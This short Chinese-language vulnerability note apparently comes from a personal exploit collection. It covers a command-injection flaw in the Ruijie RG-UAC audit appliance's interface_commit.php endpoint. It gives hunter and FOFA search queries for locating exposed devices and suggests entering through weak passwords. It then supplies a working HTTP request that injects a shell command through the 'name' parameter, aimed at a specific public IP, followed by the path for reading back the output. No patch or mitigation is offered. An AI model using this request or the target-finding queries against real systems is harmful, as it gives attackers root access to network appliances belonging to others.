# 锐捷RG-UAC统一上网行为管理审计系统interface_commit后台命令执行漏洞

# 一、漏洞简介
锐捷RG-UAC统一上网行为管理审计系统存在命令执行漏洞,可以通过漏洞获取root权限 。

# 二、影响版本
+ 锐捷RG-UAC统一上网行为管理审计系统

# 三、资产测绘
+ hunter`app.name="Ruijie 锐捷 RG-UAC"`
+ fofoa:`app="Ruijie-RG-UAC"`

登录页

![1711942665811-46dbe53d-d2cc-433f-ac40-7a78aa2d4c6c.png](./img/7GS4i25yp901yTrJ/1711942665811-46dbe53d-d2cc-433f-ac40-7a78aa2d4c6c-355914.png)

# 四、漏洞复现
使用弱口令/敏感信息泄露漏洞登录系统后台

![1714985896501-ee5e7557-a9fe-4b1f-9baa-a777b9f147e5.png](./img/7GS4i25yp901yTrJ/1714985896501-ee5e7557-a9fe-4b1f-9baa-a777b9f147e5-531206.png)

获取Cookie后使用下面poc

```plain
GET /view/networkConfig/physicalInterface/interface_commit.php?name=`id+>1.txt` HTTP/1.1
Host: 183.230.22.108:4443
Cookie: PHPSESSID=ae63a240e1fdfb5614107040d19120f3
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
```

![1714987361587-af66e872-c696-4185-a646-d394c9950b5d.png](./img/7GS4i25yp901yTrJ/1714987361587-af66e872-c696-4185-a646-d394c9950b5d-066130.png)

```plain
/view/networkConfig/physicalInterface/1.txt
```

![1714987618903-d101e763-9815-4ca3-847c-11797e46adc3.png](./img/7GS4i25yp901yTrJ/1714987618903-d101e763-9815-4ca3-847c-11797e46adc3-056117.png)



> 更新: 2024-06-24 11:42:28  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/aya1yceayqpleil4>